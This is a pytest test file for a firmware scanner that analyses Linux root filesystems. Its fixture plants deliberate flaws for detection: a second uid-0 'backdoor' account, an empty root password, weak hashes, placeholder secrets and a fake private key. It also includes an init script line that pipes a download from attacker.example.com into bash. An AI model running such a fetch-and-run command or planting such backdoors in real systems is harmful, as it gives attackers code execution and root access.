"""Tests for Feature 5: Linux rootfs deep analysis."""
from __future__ import annotations

import os
import stat
import sys
from pathlib import Path

import pytest

from firmware_scanner import rootfs_analysis
from firmware_scanner.rootfs_analysis import (
    _parse_passwd,
    _parse_shadow,
    _find_suid_sgid,
    _find_world_writable,
    _scan_configs_for_secrets,
    _find_ssh_keys,
    _read_kernel_banner,
    _find_web_roots,
)


# ── Mini-rootfs fixture ───────────────────────────────────────────────────────

@pytest.fixture
def mini_rootfs(tmp_path) -> Path:
    """Synthetic Linux rootfs with:
    - /etc/passwd  : root (uid 0) + backdoor (uid 0) + normal user
    - /etc/shadow  : root with empty password, normal with $1$ (MD5-crypt) hash
    - /etc/init.d/S99start.sh : hardcoded password + wget | bash pipe
    - /bin/busybox : SUID bit set (expected, safe dir)
    - /usr/local/backdoor : SUID bit set outside safe dirs
    - /tmp/writable : world-writable file
    - /root/.ssh/id_rsa : fake SSH private key
    - /etc/config.cfg : hardcoded secret
    - /proc/version : kernel banner
    - /var/www/html/index.php : PHP file in web root
    """
    root = tmp_path / "rootfs"
    root.mkdir()

    # /etc
    etc = root / "etc"
    etc.mkdir()
    (etc / "passwd").write_text(
        "root:x:0:0:root:/root:/bin/bash\n"
        "backdoor:x:0:0:backdoor:/:/bin/sh\n"
        "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n"
        "alice:x:1000:1000:alice:/home/alice:/bin/bash\n",
        encoding="utf-8",
    )
    (etc / "shadow").write_text(
        "root::17000:0:99999:7:::\n"                          # empty password
        "backdoor:$1$salt$hash:17000:0:99999:7:::\n"          # MD5-crypt (weak)
        "nobody:*:17000:0:99999:7:::\n"
        "alice:$6$salt$longhash:17000:0:99999:7:::\n",
        encoding="utf-8",
    )
    (etc / "config.cfg").write_text(
        "hostname=mydevice\n"
        "password=supersecret123\n"
        "api_key=AKIAIOSFODNN7EXAMPLE\n",
        encoding="utf-8",
    )

    # /etc/init.d
    initd = etc / "init.d"
    initd.mkdir()
    (initd / "S99start.sh").write_text(
        "#!/bin/sh\n"
        "PASSWORD=admin123\n"
        "wget http://attacker.example.com/payload.sh | bash\n",
        encoding="utf-8",
    )

    # /bin + /usr/local (for SUID testing)
    bin_dir = root / "bin"
    bin_dir.mkdir()
    busybox = bin_dir / "busybox"
    busybox.write_bytes(b"\x7fELF" + b"\x00" * 128)

    usr_local = root / "usr" / "local"
    usr_local.mkdir(parents=True)
    backdoor_bin = usr_local / "backdoor"
    backdoor_bin.write_bytes(b"\x7fELF" + b"\x00" * 128)

    # /tmp (world-writable)
    tmp_dir = root / "tmp"
    tmp_dir.mkdir()
    writable = tmp_dir / "writable"
    writable.write_bytes(b"data")

    # /root/.ssh
    ssh_dir = root / "root" / ".ssh"
    ssh_dir.mkdir(parents=True)
    (ssh_dir / "id_rsa").write_text(
        "-----BEGIN RSA PRIVATE KEY-----\n"
        "MIIEowIBAAKCAQEA3a9cGMxrXXXXXXXXXXXXXXXXXXXXXX==\n"
        "-----END RSA PRIVATE KEY-----\n",
        encoding="utf-8",
    )
    (ssh_dir / "authorized_keys").write_text(
        "ssh-rsa AAAAB3NzaC1yc2E... user@host\n",
        encoding="utf-8",
    )

    # /proc/version (kernel banner)
    proc = root / "proc"
    proc.mkdir()
    (proc / "version").write_text(
        "Linux version 4.9.0-generic (buildd@ubuntu) (gcc version 6.3.0) #1 SMP Mon Jan 01 00:00:00 UTC 2018",
        encoding="utf-8",
    )

    # /var/www/html
    www = root / "var" / "www" / "html"
    www.mkdir(parents=True)
    (www / "index.php").write_text("<?php echo 'hello'; ?>", encoding="utf-8")

    # --- Set file permissions on non-Windows only (stat bits unsupported on Windows)
    if sys.platform != "win32":
        os.chmod(busybox, 0o4755)         # SUID in /bin (safe)
        os.chmod(backdoor_bin, 0o4755)    # SUID outside safe dirs
        os.chmod(writable, 0o0777)        # world-writable

    return root


# ── Structure ─────────────────────────────────────────────────────────────────

def test_analyze_returns_dict(mini_rootfs):
    r = rootfs_analysis.analyze(mini_rootfs)
    assert isinstance(r, dict)


def test_analyze_required_keys(mini_rootfs):
    r = rootfs_analysis.analyze(mini_rootfs)
    for k in ("available", "root_dir", "accounts", "shadow", "init_findings",
              "suid_files", "world_writable", "ssh_keys", "config_secrets",
              "kernel_banner", "web_files", "flags", "error"):
        assert k in r, f"missing key: {k}"


def test_analyze_available_true(mini_rootfs):
    r = rootfs_analysis.analyze(mini_rootfs)
    assert r["available"] is True


def test_analyze_nonexistent_dir():
    r = rootfs_analysis.analyze(Path("/no/such/rootfs"))
    assert r["available"] is False
    assert "error" in r


def test_analyze_never_raises(tmp_path):
    r = rootfs_analysis.analyze(tmp_path / "missing")
    assert isinstance(r, dict)


# ── /etc/passwd parsing ───────────────────────────────────────────────────────

def test_parse_passwd_finds_accounts(mini_rootfs):
    accounts = _parse_passwd(mini_rootfs)
    usernames = [a["user"] for a in accounts]
    assert "root" in usernames
    assert "alice" in usernames


def test_parse_passwd_uid_zero_accounts(mini_rootfs):
    accounts = _parse_passwd(mini_rootfs)
    uid0 = [a for a in accounts if a["uid"] == 0]
    assert len(uid0) == 2   # root + backdoor


def test_parse_passwd_missing_file(tmp_path):
    """No /etc/passwd → empty list, no crash."""
    accounts = _parse_passwd(tmp_path)
    assert accounts == []


# ── /etc/shadow parsing ───────────────────────────────────────────────────────

def test_parse_shadow_finds_entries(mini_rootfs):
    shadow = _parse_shadow(mini_rootfs)
    users = [e["user"] for e in shadow]
    assert "root" in users


def test_parse_shadow_root_empty_password(mini_rootfs):
    shadow = _parse_shadow(mini_rootfs)
    root_entry = next((e for e in shadow if e["user"] == "root"), None)
    assert root_entry is not None
    assert root_entry["empty_password"] is True


def test_parse_shadow_weak_md5_hash(mini_rootfs):
    shadow = _parse_shadow(mini_rootfs)
    backdoor_entry = next((e for e in shadow if e["user"] == "backdoor"), None)
    assert backdoor_entry is not None
    assert backdoor_entry["weak_hash"] is True
    assert backdoor_entry["hash_type"] == "md5_crypt"


# ── Flags ─────────────────────────────────────────────────────────────────────

def test_flag_extra_root_uid(mini_rootfs):
    r = rootfs_analysis.analyze(mini_rootfs)
    assert "extra_root_uid_account" in r["flags"]


def test_flag_root_empty_password(mini_rootfs):
    r = rootfs_analysis.analyze(mini_rootfs)
    assert "root_empty_password" in r["flags"]


def test_flag_accounts_with_empty_password(mini_rootfs):
    r = rootfs_analysis.analyze(mini_rootfs)
    assert "accounts_with_empty_password" in r["flags"]


def test_flag_weak_password_hash(mini_rootfs):
    r = rootfs_analysis.analyze(mini_rootfs)
    assert "weak_password_hash" in r["flags"]


def test_flag_hardcoded_secrets(mini_rootfs):
    r = rootfs_analysis.analyze(mini_rootfs)
    assert "hardcoded_secrets" in r["flags"]


def test_flag_private_key_in_rootfs(mini_rootfs):
    r = rootfs_analysis.analyze(mini_rootfs)
    assert "private_key_in_rootfs" in r["flags"]


# ── SUID detection ────────────────────────────────────────────────────────────

@pytest.mark.skipif(sys.platform == "win32", reason="chmod not supported on Windows")
def test_suid_outside_safe_dirs_detected(mini_rootfs):
    r = rootfs_analysis.analyze(mini_rootfs)
    outside = [s for s in r["suid_files"] if s["outside_safe"]]
    assert len(outside) >= 1
    # backdoor in /usr/local (not a safe dir)
    assert any("backdoor" in s["path"] for s in outside)


@pytest.mark.skipif(sys.platform == "win32", reason="chmod not supported on Windows")
def test_suid_in_safe_dirs_not_flagged(mini_rootfs):
    r = rootfs_analysis.analyze(mini_rootfs)
    safe = [s for s in r["suid_files"] if not s["outside_safe"]]
    assert any("busybox" in s["path"] for s in safe)


# ── SSH keys ──────────────────────────────────────────────────────────────────

def test_ssh_private_key_found(mini_rootfs):
    r = rootfs_analysis.analyze(mini_rootfs)
    private_keys = [k for k in r["ssh_keys"] if k["is_private"]]
    assert len(private_keys) >= 1


def test_authorized_keys_found(mini_rootfs):
    r = rootfs_analysis.analyze(mini_rootfs)
    auth = [k for k in r["ssh_keys"] if "authorized_keys" in k["path"]]
    assert len(auth) >= 1


# ── Config secrets ────────────────────────────────────────────────────────────

def test_config_secrets_detected(mini_rootfs):
    r = rootfs_analysis.analyze(mini_rootfs)
    assert len(r["config_secrets"]) > 0


def test_config_secret_has_excerpt(mini_rootfs):
    r = rootfs_analysis.analyze(mini_rootfs)
    for s in r["config_secrets"]:
        assert "excerpt" in s
        assert "path" in s


# ── Kernel banner ─────────────────────────────────────────────────────────────

def test_kernel_banner_read(mini_rootfs):
    r = rootfs_analysis.analyze(mini_rootfs)
    assert r["kernel_banner"] is not None
    assert "Linux" in r["kernel_banner"]


# ── Web files ────────────────────────────────────────────────────────────────

def test_web_files_found(mini_rootfs):
    r = rootfs_analysis.analyze(mini_rootfs)
    assert len(r["web_files"]) >= 1
    assert any(".php" in f["path"] for f in r["web_files"])


# ── Init scripts ─────────────────────────────────────────────────────────────

def test_init_script_wget_pipe_found(mini_rootfs):
    r = rootfs_analysis.analyze(mini_rootfs)
    pipes = [f for f in r["init_findings"] if f["type"] == "shell_pipe_download"]
    assert len(pipes) >= 1


def test_init_script_credential_found(mini_rootfs):
    r = rootfs_analysis.analyze(mini_rootfs)
    creds = [f for f in r["init_findings"] if f["type"] == "hardcoded_credential"]
    assert len(creds) >= 1


# ── World-writable ────────────────────────────────────────────────────────────

@pytest.mark.skipif(sys.platform == "win32", reason="chmod not supported on Windows")
def test_world_writable_file_found(mini_rootfs):
    r = rootfs_analysis.analyze(mini_rootfs)
    assert len(r["world_writable"]) >= 1


# ── Clean rootfs has no flags ─────────────────────────────────────────────────

def test_clean_rootfs_no_flags(tmp_path):
    """A rootfs with only /etc/passwd (no bad entries) should produce no flags."""
    root = tmp_path / "clean"
    root.mkdir()
    (root / "etc").mkdir()
    (root / "etc" / "passwd").write_text(
        "root:x:0:0:root:/root:/bin/bash\n"
        "alice:x:1000:1000:alice:/home/alice:/bin/bash\n",
        encoding="utf-8",
    )
    (root / "etc" / "shadow").write_text(
        "root:$6$salt$long_hash:17000:0:99999:7:::\n"
        "alice:$6$salt$long_hash:17000:0:99999:7:::\n",
        encoding="utf-8",
    )
    r = rootfs_analysis.analyze(root)
    assert r["available"] is True
    assert r["flags"] == []
